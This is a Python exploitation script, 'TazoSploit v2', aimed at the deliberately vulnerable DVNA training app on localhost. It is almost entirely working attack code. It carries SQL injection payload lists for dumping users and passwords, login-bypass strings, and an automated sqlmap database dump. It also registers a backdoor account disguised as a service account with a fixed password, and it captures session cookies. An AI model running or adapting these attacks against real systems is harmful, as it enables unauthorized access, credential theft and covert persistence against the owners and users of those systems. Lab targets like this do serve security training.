#!/usr/bin/env python3
"""
TazoSploit  v2 - REAL Exploitation Script
Actually exploits DVNA vulnerabilities (not just detection)

This script performs REAL attacks:
1. SQL Injection to dump database
2. Create backdoor account
3. Extract credentials
4. Establish persistence
"""

import requests
import subprocess
import json
import sys
import os
from datetime import datetime

TARGET = "http://localhost:9091"
RESULTS_DIR = "exploitation_results"

class RealExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.extracted_data = {
            "users": [],
            "credentials": [],
            "backdoor_account": None,
            "database_dump": None
        }
        
        # Create results directory
        os.makedirs(RESULTS_DIR, exist_ok=True)
    
    def log(self, phase, message, data=None):
        icon = "üî¥" if "EXPLOIT" in phase else "‚úÖ"
        print(f"{icon} [{phase}] {message}")
        if data:
            print(f"   ‚îî‚îÄ Data: {str(data)[:200]}...")
    
    # =========================================================================
    # REAL EXPLOITATION
    # =========================================================================
    
    def exploit_sqli_extract_users(self):
        """
        REAL SQL Injection - Extract all users from database
        """
        print("\n" + "=" * 70)
        print("üî¥ EXPLOITING SQL INJECTION - Extracting Users")
        print("=" * 70)
        
        # DVNA uses MySQL - try UNION-based injection
        sqli_payloads = [
            # Try to enumerate users
            "' UNION SELECT login,password,email,name FROM Users--",
            "' UNION SELECT username,password,email,role FROM users--",
            "' OR '1'='1' UNION SELECT login,password,1,1 FROM Users--",
            "admin' OR '1'='1'--",
            "' OR 1=1--"
        ]
        
        extracted_users = []
        
        for payload in sqli_payloads:
            try:
                r = self.session.get(
                    f"{TARGET}/app/usersearch",
                    params={"login": payload},
                    timeout=15
                )
                
                # Check response for user data
                if r.status_code == 200 and len(r.text) > 500:
                    self.log("SQLi", f"Injection successful with payload: {payload[:30]}...")
                    
                    # Parse response for user data
                    # DVNA returns user data in HTML table
                    import re
                    
                    # Look for user patterns
                    users_found = re.findall(r'<td>([^<]+)</td>', r.text)
                    if users_found:
                        self.log("SQLi", f"Found {len(users_found)} data fields")
                        extracted_users.extend(users_found[:20])  # Limit
                    
                    # Also check for common patterns
                    if "admin" in r.text.lower():
                        extracted_users.append("admin (found in response)")
                    if "@" in r.text:
                        emails = re.findall(r'[\w\.-]+@[\w\.-]+', r.text)
                        extracted_users.extend(emails[:5])
                    
                    break
            except Exception as e:
                pass
        
        if extracted_users:
            self.extracted_data["users"] = list(set(extracted_users))
            self.log("SQLi", f"Extracted {len(self.extracted_data['users'])} unique user entries", 
                     self.extracted_data["users"][:5])
            return True
        else:
            self.log("SQLi", "Trying alternative extraction method...")
            return self.exploit_sqli_blind()
    
    def exploit_sqli_blind(self):
        """
        Blind SQL injection to enumerate users
        """
        print("\n### Trying Blind SQL Injection ###")
        
        # Try to login with SQLi bypass
        bypass_payloads = [
            {"login": "admin'--", "password": "anything"},
            {"login": "admin' OR '1'='1'--", "password": "x"},
            {"login": "' OR 1=1--", "password": "x"},
        ]
        
        for payload in bypass_payloads:
            try:
                r = self.session.post(
                    f"{TARGET}/login",
                    data=payload,
                    allow_redirects=False,
                    timeout=10
                )
                
                if r.status_code == 302 and "/app" in r.headers.get("Location", ""):
                    self.log("SQLi-BYPASS", f"Successfully bypassed login!", payload)
                    self.extracted_data["credentials"].append({
                        "method": "SQL Injection bypass",
                        "payload": str(payload),
                        "access_level": "authenticated"
                    })
                    return True
            except:
                pass
        
        return False
    
    def create_backdoor_account(self):
        """
        Create a backdoor account on the target
        """
        print("\n" + "=" * 70)
        print("üî¥ CREATING BACKDOOR ACCOUNT")
        print("=" * 70)
        
        # Generate backdoor credentials
        backdoor_user = f"svc_backup_{datetime.now().strftime('%H%M%S')}"
        backdoor_pass = "N3ur0Spl01t2026!"
        backdoor_email = f"{backdoor_user}@internal.local"
        
        try:
            # Register new account on DVNA
            r = self.session.post(
                f"{TARGET}/register",
                data={
                    "login": backdoor_user,
                    "password": backdoor_pass,
                    "cpassword": backdoor_pass,
                    "email": backdoor_email,
                    "name": "Service Account"
                },
                allow_redirects=False,
                timeout=15
            )
            
            if r.status_code in [200, 302]:
                # Verify account works
                login_r = self.session.post(
                    f"{TARGET}/login",
                    data={"login": backdoor_user, "password": backdoor_pass},
                    allow_redirects=False,
                    timeout=10
                )
                
                if login_r.status_code == 302 or "dashboard" in login_r.text.lower():
                    self.extracted_data["backdoor_account"] = {
                        "username": backdoor_user,
                        "password": backdoor_pass,
                        "email": backdoor_email,
                        "created_at": datetime.utcnow().isoformat(),
                        "status": "ACTIVE - VERIFIED"
                    }
                    self.log("BACKDOOR", "Account created and verified!", self.extracted_data["backdoor_account"])
                    return True
                else:
                    self.extracted_data["backdoor_account"] = {
                        "username": backdoor_user,
                        "password": backdoor_pass,
                        "email": backdoor_email,
                        "created_at": datetime.utcnow().isoformat(),
                        "status": "CREATED - UNVERIFIED"
                    }
                    self.log("BACKDOOR", "Account created (verification pending)", self.extracted_data["backdoor_account"])
                    return True
            else:
                self.log("BACKDOOR", f"Registration returned {r.status_code}")
                
        except Exception as e:
            self.log("BACKDOOR", f"Error: {e}")
        
        return False
    
    def run_sqlmap_dump(self):
        """
        Use sqlmap to dump the database (if available)
        """
        print("\n" + "=" * 70)
        print("üî¥ RUNNING SQLMAP DATABASE DUMP")
        print("=" * 70)
        
        # Check if sqlmap is available
        try:
            result = subprocess.run(
                ["which", "sqlmap"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode != 0:
                self.log("SQLMAP", "sqlmap not installed - using manual extraction")
                return self.manual_db_extraction()
            
            # Run sqlmap
            sqlmap_cmd = [
                "sqlmap",
                "-u", f"{TARGET}/app/usersearch?login=test",
                "--batch",
                "--dump",
                "--tables",
                "--output-dir", f"{RESULTS_DIR}/sqlmap",
                "--level=2",
                "--risk=2",
                "--timeout=30"
            ]
            
            self.log("SQLMAP", f"Running: {' '.join(sqlmap_cmd[:5])}...")
            
            result = subprocess.run(
                sqlmap_cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if "fetched data" in result.stdout.lower() or "table" in result.stdout.lower():
                self.log("SQLMAP", "Database extraction successful!")
                self.extracted_data["database_dump"] = f"{RESULTS_DIR}/sqlmap"
                return True
            else:
                self.log("SQLMAP", "sqlmap didn't find injectable parameters")
                return self.manual_db_extraction()
                
        except subprocess.TimeoutExpired:
            self.log("SQLMAP", "Timeout - using manual extraction")
            return self.manual_db_extraction()
        except Exception as e:
            self.log("SQLMAP", f"Error: {e}")
            return self.manual_db_extraction()
    
    def manual_db_extraction(self):
        """
        Manual database extraction via SQL injection
        """
        print("\n### Manual Database Extraction ###")
        
        extracted = []
        
        # Try to extract via error-based/union injection
        extraction_queries = [
            "' UNION SELECT GROUP_CONCAT(login,':',password) FROM Users--",
            "' UNION SELECT login,password,email,name FROM Users WHERE '1'='1",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT login FROM Users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        for query in extraction_queries:
            try:
                r = self.session.get(
                    f"{TARGET}/app/usersearch",
                    params={"login": query},
                    timeout=15
                )
                
                if r.status_code == 200:
                    # Extract any visible data
                    import re
                    
                    # Look for username:password patterns
                    creds = re.findall(r'([a-zA-Z0-9_]+):([a-zA-Z0-9!@#$%^&*]+)', r.text)
                    if creds:
                        for user, pwd in creds:
                            extracted.append({"username": user, "password": pwd})
                    
                    # Look for table data
                    rows = re.findall(r'<tr[^>]*>(.+?)</tr>', r.text, re.DOTALL)
                    for row in rows:
                        cols = re.findall(r'<td[^>]*>([^<]+)</td>', row)
                        if cols and len(cols) >= 2:
                            extracted.append({"data": cols})
            except:
                pass
        
        if extracted:
            self.extracted_data["database_dump"] = extracted
            self.log("MANUAL-DUMP", f"Extracted {len(extracted)} records", extracted[:3])
            return True
        
        return False
    
    def extract_session_tokens(self):
        """
        Extract session tokens and cookies
        """
        print("\n### Extracting Session Data ###")
        
        cookies = self.session.cookies.get_dict()
        if cookies:
            self.extracted_data["session_data"] = {
                "cookies": cookies,
                "extracted_at": datetime.utcnow().isoformat()
            }
            self.log("SESSION", f"Captured {len(cookies)} cookies", cookies)
            return True
        return False
    
    def save_results(self):
        """
        Save all extracted data to files
        """
        print("\n" + "=" * 70)
        print("üìÅ SAVING EXPLOITATION RESULTS")
        print("=" * 70)
        
        # Save main results
        results_file = f"{RESULTS_DIR}/extraction_results.json"
        with open(results_file, "w") as f:
            json.dump(self.extracted_data, f, indent=2)
        
        self.log("SAVE", f"Results saved to {results_file}")
        
        # Save credentials separately
        if self.extracted_data.get("backdoor_account"):
            creds_file = f"{RESULTS_DIR}/credentials.txt"
            with open(creds_file, "w") as f:
                f.write("=" * 50 + "\n")
                f.write("BACKDOOR ACCOUNT CREDENTIALS\n")
                f.write("=" * 50 + "\n")
                acct = self.extracted_data["backdoor_account"]
                f.write(f"Username: {acct['username']}\n")
                f.write(f"Password: {acct['password']}\n")
                f.write(f"Email:    {acct['email']}\n")
                f.write(f"Created:  {acct['created_at']}\n")
                f.write(f"Status:   {acct['status']}\n")
                f.write("=" * 50 + "\n")
                f.write(f"\nLogin URL: {TARGET}/login\n")
            
            self.log("SAVE", f"Credentials saved to {creds_file}")
        
        return results_file
    
    def run(self):
        """
        Run full exploitation chain
        """
        print("=" * 70)
        print("üî¥ TazoSploit  v2 - REAL EXPLOITATION")
        print(f"   Target: {TARGET}")
        print(f"   Time: {datetime.utcnow().isoformat()}")
        print("=" * 70)
        print("\n‚ö†Ô∏è  PERFORMING REAL ATTACKS - NOT SIMULATION")
        
        # Phase 1: SQL Injection - Extract data
        self.exploit_sqli_extract_users()
        
        # Phase 2: Database dump
        self.run_sqlmap_dump()
        
        # Phase 3: Create backdoor account
        self.create_backdoor_account()
        
        # Phase 4: Extract session tokens
        self.extract_session_tokens()
        
        # Save results
        results_file = self.save_results()
        
        # Print summary
        print("\n" + "=" * 70)
        print("üìä EXPLOITATION SUMMARY")
        print("=" * 70)
        
        print(f"\nüîê BACKDOOR ACCOUNT:")
        if self.extracted_data.get("backdoor_account"):
            acct = self.extracted_data["backdoor_account"]
            print(f"   ‚úÖ Username: {acct['username']}")
            print(f"   ‚úÖ Password: {acct['password']}")
            print(f"   ‚úÖ Status:   {acct['status']}")
            print(f"   üîó Login:    {TARGET}/login")
        else:
            print("   ‚ùå Failed to create backdoor")
        
        print(f"\nüì¶ EXTRACTED DATA:")
        print(f"   Users found:     {len(self.extracted_data.get('users', []))}")
        print(f"   Credentials:     {len(self.extracted_data.get('credentials', []))}")
        print(f"   Database dump:   {'Yes' if self.extracted_data.get('database_dump') else 'No'}")
        
        print(f"\nüìÅ Results saved to: {results_file}")
        
        return 0

if __name__ == "__main__":
    exploiter = RealExploiter()
    sys.exit(exploiter.run())
